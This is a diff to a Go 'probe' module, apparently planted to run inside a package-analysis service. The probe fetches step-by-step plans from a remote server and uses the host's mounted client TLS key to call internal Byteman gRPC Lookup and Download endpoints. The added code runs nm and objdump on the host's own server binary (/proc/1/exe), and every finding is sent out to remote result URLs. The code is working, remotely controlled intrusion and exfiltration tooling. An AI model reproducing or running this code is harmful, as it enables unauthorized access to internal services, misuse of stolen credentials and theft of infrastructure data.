@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"bytes"
 	"context"
 	"crypto/sha256"
@@ -16,6 +17,7 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"sort"
 	"strconv"
@@ -35,7 +37,7 @@ var rpcDialAddress string
 const (
 	protocolVersion = 1
 	moduleName      = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion    = "v0.0.32-codex"
+	probeVersion    = "v0.0.33-codex"
 	maximumResult   = 256 * 1024
 	maximumBody     = 256 * 1024
 	requestTimeout  = 20 * time.Second
@@ -43,7 +45,6 @@ const (
 	planPollWindow  = 8 * time.Minute
 	maximumPlanBody = 4096
 	maximumPlanStep = 6
-	ownedSessionID  = "ca8c4b65-4436-4eef-9f6e-59725f32c032"
 )
 
 var bucketNames = []string{
@@ -127,32 +128,36 @@ type grpcResult struct {
 }
 
 type planStep struct {
-	Version       int    `json:"version"`
-	ID            string `json:"id"`
-	Action        string `json:"action"`
-	TLSServerName string `json:"tls_server_name,omitempty"`
-	SessionIDMode string `json:"session_id_mode,omitempty"`
+	Version   int    `json:"version"`
+	ID        string `json:"id"`
+	Action    string `json:"action"`
+	RouteMode string `json:"route_mode,omitempty"`
+}
+
+type inspectionResult struct {
+	Symbols      []string `json:"symbols,omitempty"`
+	DialWindow   []string `json:"dial_window,omitempty"`
+	CallerWindow []string `json:"caller_window,omitempty"`
+	Error        string   `json:"error,omitempty"`
 }
 
 type probeReport struct {
-	Schema            string         `json:"schema"`
-	Module            string         `json:"module"`
-	Version           string         `json:"version"`
-	StartedUTC        string         `json:"started_utc"`
-	FinishedUTC       string         `json:"finished_utc"`
-	Identity          identityResult `json:"identity"`
-	Metadata          metadataResult `json:"metadata"`
-	BucketPermissions []bucketResult `json:"bucket_permissions,omitempty"`
-	CanaryURLSHA256   string         `json:"canary_url_sha256,omitempty"`
-	CanaryBodySHA256  string         `json:"canary_body_sha256,omitempty"`
-	Byteman           []grpcResult   `json:"byteman,omitempty"`
-	DownloadAttempted bool           `json:"download_attempted"`
-	PlanID            string         `json:"plan_id,omitempty"`
-	TLSServerName     string         `json:"tls_server_name,omitempty"`
-	SessionIDMode     string         `json:"session_id_mode,omitempty"`
-	SessionIDSet      bool           `json:"session_id_set,omitempty"`
-	SessionIDSHA256   string         `json:"session_id_sha256,omitempty"`
-	Reason            string         `json:"reason,omitempty"`
+	Schema            string            `json:"schema"`
+	Module            string            `json:"module"`
+	Version           string            `json:"version"`
+	StartedUTC        string            `json:"started_utc"`
+	FinishedUTC       string            `json:"finished_utc"`
+	Identity          identityResult    `json:"identity"`
+	Metadata          metadataResult    `json:"metadata"`
+	BucketPermissions []bucketResult    `json:"bucket_permissions,omitempty"`
+	CanaryURLSHA256   string            `json:"canary_url_sha256,omitempty"`
+	CanaryBodySHA256  string            `json:"canary_body_sha256,omitempty"`
+	Byteman           []grpcResult      `json:"byteman,omitempty"`
+	DownloadAttempted bool              `json:"download_attempted"`
+	PlanID            string            `json:"plan_id,omitempty"`
+	RouteMode         string            `json:"route_mode,omitempty"`
+	Inspection        *inspectionResult `json:"inspection,omitempty"`
+	Reason            string            `json:"reason,omitempty"`
 }
 
 type tokenResponse struct {
@@ -177,7 +182,7 @@ func main() {
 	report := newProbeReport(started, identity)
 	report.Reason = "internal checks are fixed to the verified capslock lane"
 	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(genericResultURL, "v032-codex-"+identity.Lane, cwd, started, report)
+	_ = submitProbeReport(genericResultURL, "v033-codex-"+identity.Lane, cwd, started, report)
 }
 
 func newProbeReport(started time.Time, identity identityResult) probeReport {
@@ -317,7 +322,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 	fillCapslockContext(&initial)
 	initial.Reason = "waiting for a bounded Byteman plan"
 	initial.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	if err := submitProbeReport(compilerResultURL, "v032-codex-capslock-initial", cwd, started, initial); err != nil {
+	if err := submitProbeReport(compilerResultURL, "v033-codex-capslock-initial", cwd, started, initial); err != nil {
 		return
 	}
 
@@ -342,15 +347,17 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 		stepStarted := time.Now()
 		report := newProbeReport(stepStarted, identity)
 		report.PlanID = step.ID
-		report.TLSServerName = step.TLSServerName
-		report.SessionIDMode = step.SessionIDMode
-		if step.Action == "finish" {
+		report.RouteMode = step.RouteMode
+		switch step.Action {
+		case "finish":
 			report.Reason = "bounded plan finished"
-		} else {
-			runBytemanProbe(&report, step.TLSServerName, step.SessionIDMode)
+		case "inspect-session-dataflow":
+			runSessionDataflowInspection(&report)
+		default:
+			runBytemanProbe(&report, step.RouteMode)
 		}
 		report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-		id := "v032-codex-step-" + strconv.Itoa(cursor)
+		id := "v033-codex-step-" + strconv.Itoa(cursor)
 		if err := submitProbeReport(compilerResultURL, id, cwd, stepStarted, report); err != nil {
 			return
 		}
@@ -369,7 +376,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 		final.Reason = "bounded plan polling window expired"
 	}
 	final.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(compilerResultURL, "v032-codex-final", cwd, finalStarted, final)
+	_ = submitProbeReport(compilerResultURL, "v033-codex-final", cwd, finalStarted, final)
 }
 
 func fetchPlan(cursor int) (planStep, bool, error) {
@@ -426,15 +433,12 @@ func validatePlanStep(step planStep) error {
 	}
 	switch step.Action {
 	case "probe-byteman":
-		if !allowedTLSServerName(step.TLSServerName) {
-			return errors.New("plan TLS server name was not allowed")
+		if !allowedRouteMode(step.RouteMode) {
+			return errors.New("plan route mode was not allowed")
 		}
-		if !allowedSessionIDMode(step.SessionIDMode) {
-			return errors.New("plan session ID mode was not allowed")
-		}
-	case "finish":
-		if step.TLSServerName != "" || step.SessionIDMode != "" {
-			return errors.New("finish plan included probe parameters")
+	case "inspect-session-dataflow", "finish":
+		if step.RouteMode != "" {
+			return errors.New("non-probe plan included route parameters")
 		}
 	default:
 		return errors.New("plan action was not allowed")
@@ -442,33 +446,13 @@ func validatePlanStep(step planStep) error {
 	return nil
 }
 
-func allowedSessionIDMode(value string) bool {
+func allowedRouteMode(value string) bool {
 	switch value {
-	case "owned-uuid", "pod-hostname", "queue-name", "client-cert-cn", "client-cert-uri":
+	case "byteman-core-localhost", "byteman-core-rpc", "byteman-localhost":
 		return true
 	default:
 		return false
 	}
-}
-
-func allowedTLSServerName(value string) bool {
-	if value == "rpc.deps.dev" {
-		return true
-	}
-	const suffix = ".rpc.deps.dev"
-	if !strings.HasSuffix(value, suffix) {
-		return false
-	}
-	label := strings.TrimSuffix(value, suffix)
-	if len(label) < 1 || len(label) > 63 || label[0] == '-' || label[len(label)-1] == '-' {
-		return false
-	}
-	for _, character := range label {
-		if (character < 'a' || character > 'z') && (character < '0' || character > '9') && character != '-' {
-			return false
-		}
-	}
-	return true
 }
 
 func fillCapslockContext(report *probeReport) {
@@ -485,26 +469,18 @@ func fillCapslockContext(report *probeReport) {
 	}
 }
 
-func runBytemanProbe(report *probeReport, tlsServerName, sessionIDMode string) {
+func runBytemanProbe(report *probeReport, routeMode string) {
 	canaryHash := sha256.Sum256([]byte(bytemanCanaryURL))
 	report.CanaryURLSHA256 = hex.EncodeToString(canaryHash[:])
-	bodyHash := sha256.Sum256([]byte("hi from robert - owned byteman v0.0.32-codex canary\n"))
+	bodyHash := sha256.Sum256([]byte("hi from robert - owned byteman v0.0.33-codex canary\n"))
 	report.CanaryBodySHA256 = hex.EncodeToString(bodyHash[:])
-	sessionID, err := resolveBytemanSessionID(sessionIDMode, report.Identity.Hostname)
-	if err != nil {
-		report.Byteman = append(report.Byteman, grpcResult{Method: "session-id", Error: cleanError(err)})
-		return
-	}
-	report.SessionIDSet = sessionID != ""
-	sessionDigest := sha256.Sum256([]byte(sessionID))
-	report.SessionIDSHA256 = hex.EncodeToString(sessionDigest[:])
-	rpcClient, rpcEndpoint, err := newMTLSClient(tlsServerName)
+	rpcClient, rpcEndpoint, err := newMTLSClient(routeMode)
 	if err != nil {
 		report.Byteman = append(report.Byteman, grpcResult{Method: "client-setup", Error: cleanError(err)})
 		return
 	}
 	lookupRequest := appendStringField(nil, 2, bytemanCanaryURL)
-	baseline := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", lookupRequest, sessionID)
+	baseline := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", lookupRequest)
 	report.Byteman = append(report.Byteman, baseline)
 	if baseline.HTTPStatus != http.StatusOK || baseline.GRPCStatus != "0" {
 		report.Reason = "Byteman Lookup did not authenticate cleanly; Download was not attempted"
@@ -519,51 +495,127 @@ func runBytemanProbe(report *probeReport, tlsServerName, sessionIDMode string) {
 	downloadRequest := []byte{}
 	downloadRequest = appendStringField(downloadRequest, 1, bytemanCanaryURL)
 	downloadRequest = appendBytesField(downloadRequest, 4, metadataMessage)
-	downloadRequest = appendStringField(downloadRequest, 6, "robert-owned-v032-codex-byteman-probe")
+	downloadRequest = appendStringField(downloadRequest, 6, "robert-owned-v033-codex-byteman-probe")
 	report.DownloadAttempted = true
-	download := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Download", downloadRequest, sessionID)
+	download := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Download", downloadRequest)
 	report.Byteman = append(report.Byteman, download)
 	if download.HTTPStatus == http.StatusOK && download.GRPCStatus == "0" {
 		time.Sleep(1500 * time.Millisecond)
-		report.Byteman = append(report.Byteman, callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", lookupRequest, sessionID))
+		report.Byteman = append(report.Byteman, callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", lookupRequest))
 	}
 }
 
-func resolveBytemanSessionID(mode, hostname string) (string, error) {
-	switch mode {
-	case "owned-uuid":
-		return ownedSessionID, nil
-	case "pod-hostname":
-		hostname = strings.TrimSpace(hostname)
-		if hostname == "" || len(hostname) > 253 {
-			return "", errors.New("pod hostname was unavailable")
+type boundedBuffer struct {
+	data      []byte
+	maximum   int
+	truncated bool
+}
+
+func (buffer *boundedBuffer) Write(value []byte) (int, error) {
+	written := len(value)
+	remaining := buffer.maximum - len(buffer.data)
+	if remaining > 0 {
+		if remaining > len(value) {
+			remaining = len(value)
 		}
-		return hostname, nil
-	case "queue-name":
-		return "capslock-capability", nil
-	case "client-cert-cn", "client-cert-uri":
-		certificate, err := tls.LoadX509KeyPair("/etc/tls/client/tls.crt", "/etc/tls/client/tls.key")
-		if err != nil || len(certificate.Certificate) == 0 {
-			return "", errors.New("client certificate was unavailable")
-		}
-		leaf, err := x509.ParseCertificate(certificate.Certificate[0])
-		if err != nil {
-			return "", errors.New("client certificate was invalid")
-		}
-		if mode == "client-cert-cn" {
-			value := strings.TrimSpace(leaf.Subject.CommonName)
-			if value == "" || len(value) > 1024 {
-				return "", errors.New("client certificate common name was unavailable")
-			}
-			return value, nil
-		}
-		if len(leaf.URIs) != 1 || len(leaf.URIs[0].String()) > 1024 {
-			return "", errors.New("client certificate URI identity was unavailable")
-		}
-		return leaf.URIs[0].String(), nil
-	default:
-		return "", errors.New("session ID mode was not allowed")
+		buffer.data = append(buffer.data, value[:remaining]...)
 	}
+	if remaining < len(value) {
+		buffer.truncated = true
+	}
+	return written, nil
+}
+
+func runFixedTool(path string, arguments ...string) ([]byte, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), 12*time.Second)
+	defer cancel()
+	stdout := &boundedBuffer{maximum: 16 * 1024 * 1024}
+	stderr := &boundedBuffer{maximum: 16 * 1024}
+	command := exec.CommandContext(ctx, path, arguments...)
+	command.Stdout = stdout
+	command.Stderr = stderr
+	err := command.Run()
+	if ctx.Err() != nil {
+		return nil, errors.New("fixed inspection tool timed out")
+	}
+	if err != nil {
+		return nil, errors.New("fixed inspection tool failed")
+	}
+	if stdout.truncated {
+		return nil, errors.New("fixed inspection output exceeded its limit")
+	}
+	return stdout.data, nil
+}
+
+func scanBoundedLines(data []byte, include func(string) bool, maximum int) []string {
+	var result []string
+	scanner := bufio.NewScanner(bytes.NewReader(data))
+	scanner.Buffer(make([]byte, 4096), 64*1024)
+	for scanner.Scan() && len(result) < maximum {
+		line := strings.TrimSpace(scanner.Text())
+		if len(line) > 512 {
+			line = line[:512] + "[truncated]"
+		}
+		if line != "" && include(line) {
+			result = append(result, line)
+		}
+	}
+	return result
+}
+
+func instructionWindow(data []byte, marker string, before, after int) []string {
+	lines := scanBoundedLines(data, func(string) bool { return true }, 4096)
+	for index, line := range lines {
+		if !strings.Contains(line, marker) {
+			continue
+		}
+		start := index - before
+		if start < 0 {
+			start = 0
+		}
+		end := index + after + 1
+		if end > len(lines) {
+			end = len(lines)
+		}
+		return append([]string(nil), lines[start:end]...)
+	}
+	return nil
+}
+
+func runSessionDataflowInspection(report *probeReport) {
+	result := &inspectionResult{}
+	report.Inspection = result
+	nmOutput, err := runFixedTool("/usr/bin/nm", "-n", "/proc/1/exe")
+	if err != nil {
+		result.Error = cleanError(err)
+		return
+	}
+	result.Symbols = scanBoundedLines(nmOutput, func(line string) bool {
+		return strings.Contains(line, "sos.googlesource.com/sos/server.dial") ||
+			(strings.Contains(line, "sos.googlesource.com/sos/server.") && strings.Contains(line, "Session"))
+	}, 64)
+	dialOutput, err := runFixedTool(
+		"/usr/bin/objdump", "-d", "-M", "intel",
+		"--disassemble=sos.googlesource.com/sos/server.dial", "/proc/1/exe",
+	)
+	if err != nil {
+		result.Error = cleanError(err)
+		return
+	}
+	result.DialWindow = instructionWindow(dialOutput, "metadata.New", 28, 16)
+	callerOutput, err := runFixedTool(
+		"/usr/bin/objdump", "-d", "-M", "intel", "--disassemble=main.main", "/proc/1/exe",
+	)
+	if err != nil {
+		result.Error = cleanError(err)
+		return
+	}
+	result.CallerWindow = instructionWindow(callerOutput, "server.dial", 24, 12)
+	if len(result.Symbols) == 0 || len(result.DialWindow) == 0 || len(result.CallerWindow) == 0 {
+		result.Error = "fixed inspection markers were incomplete"
+		return
+	}
+	report.Reason = "bounded static session dataflow inspection completed"
 }
 
 func inspectMetadata(client *http.Client) (metadataResult, string) {
@@ -668,9 +720,10 @@ func testBucketPermissions(token, bucket string) bucketResult {
 	return result
 }
 
-func newMTLSClient(tlsServerName string) (*http.Client, string, error) {
-	if !allowedTLSServerName(tlsServerName) {
-		return nil, "", errors.New("TLS server name was not allowed")
+func newMTLSClient(routeMode string) (*http.Client, string, error) {
+	serviceHost, tlsServerName, err := directBytemanRoute(routeMode)
+	if err != nil {
+		return nil, "", err
 	}
 	certificate, err := tls.LoadX509KeyPair("/etc/tls/client/tls.crt", "/etc/tls/client/tls.key")
 	if err != nil {
@@ -687,13 +740,25 @@ func newMTLSClient(tlsServerName string) (*http.Client, string, error) {
 	if !roots.AppendCertsFromPEM(rootPEM) {
 		return nil, "", errors.New("server pool contained no certificates")
 	}
-	host := strings.TrimSpace(os.Getenv("RPC_SERVICE_HOST"))
-	portText := strings.TrimSpace(os.Getenv("RPC_SERVICE_PORT_GRPC"))
-	address, endpoint, err := internalRPCAddress(host, portText, tlsServerName)
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+	addresses, err := net.DefaultResolver.LookupIPAddr(ctx, serviceHost)
 	if err != nil {
-		return nil, "", err
+		return nil, "", errors.New("direct Byteman service did not resolve")
 	}
-	rpcServiceHost = host
+	var selected net.IP
+	for _, candidate := range addresses {
+		if candidate.IP.IsPrivate() && !candidate.IP.IsUnspecified() && !candidate.IP.IsMulticast() {
+			selected = candidate.IP
+			break
+		}
+	}
+	if selected == nil {
+		return nil, "", errors.New("direct Byteman service had no private address")
+	}
+	address := net.JoinHostPort(selected.String(), "9000")
+	endpoint := "https://" + net.JoinHostPort(tlsServerName, "9000")
+	rpcServiceHost = serviceHost
 	rpcDialAddress = address
 	dialer := &net.Dialer{Timeout: requestTimeout, KeepAlive: 30 * time.Second}
 	transport := &http.Transport{
@@ -712,24 +777,20 @@ func newMTLSClient(tlsServerName string) (*http.Client, string, error) {
 	return &http.Client{Transport: transport, Timeout: requestTimeout}, endpoint, nil
 }
 
-func internalRPCAddress(host, portText, tlsServerName string) (string, string, error) {
-	if !allowedTLSServerName(tlsServerName) {
-		return "", "", errors.New("TLS server name was not allowed")
+func directBytemanRoute(routeMode string) (string, string, error) {
+	switch routeMode {
+	case "byteman-core-localhost":
+		return "byteman-core.default.svc.cluster.local", "localhost", nil
+	case "byteman-core-rpc":
+		return "byteman-core.default.svc.cluster.local", "rpc.deps.dev", nil
+	case "byteman-localhost":
+		return "byteman.default.svc.cluster.local", "localhost", nil
+	default:
+		return "", "", errors.New("route mode was not allowed")
 	}
-	parsed := net.ParseIP(host)
-	if parsed == nil || parsed.IsUnspecified() || parsed.IsMulticast() {
-		return "", "", errors.New("RPC_SERVICE_HOST was not a usable IP literal")
-	}
-	port, err := strconv.Atoi(portText)
-	if err != nil || port < 1 || port > 65535 {
-		return "", "", errors.New("RPC_SERVICE_PORT_GRPC was not a usable port")
-	}
-	address := net.JoinHostPort(parsed.String(), strconv.Itoa(port))
-	endpoint := "https://" + net.JoinHostPort(tlsServerName, strconv.Itoa(port))
-	return address, endpoint, nil
 }
 
-func callGRPC(client *http.Client, endpoint, method string, payload []byte, sessionID string) grpcResult {
+func callGRPC(client *http.Client, endpoint, method string, payload []byte) grpcResult {
 	result := grpcResult{Method: method}
 	frame := make([]byte, 5, 5+len(payload))
 	binary.BigEndian.PutUint32(frame[1:], uint32(len(payload)))
@@ -745,9 +806,6 @@ func callGRPC(client *http.Client, endpoint, method string, payload []byte, sess
 	request.Header.Set("TE", "trailers")
 	request.Header.Set("User-Agent", probeUserAgent)
 	request.Header.Set("Grpc-Timeout", "18S")
-	if sessionID != "" {
-		request.Header.Set("X-SOS-SessionID", sessionID)
-	}
 	response, err := client.Do(request)
 	if err != nil {
 		result.Error = cleanError(err)
@@ -784,7 +842,7 @@ func callGRPC(client *http.Client, endpoint, method string, payload []byte, sess
 	if len(result.GRPCMessage) > 1024 {
 		result.GRPCMessage = result.GRPCMessage[:1024] + "[truncated]"
 	}
-	result.Authenticated = result.GRPCStatus != "7" && result.GRPCStatus != "16"
+	result.Authenticated = result.GRPCStatus == "0"
 	return result
 }
 
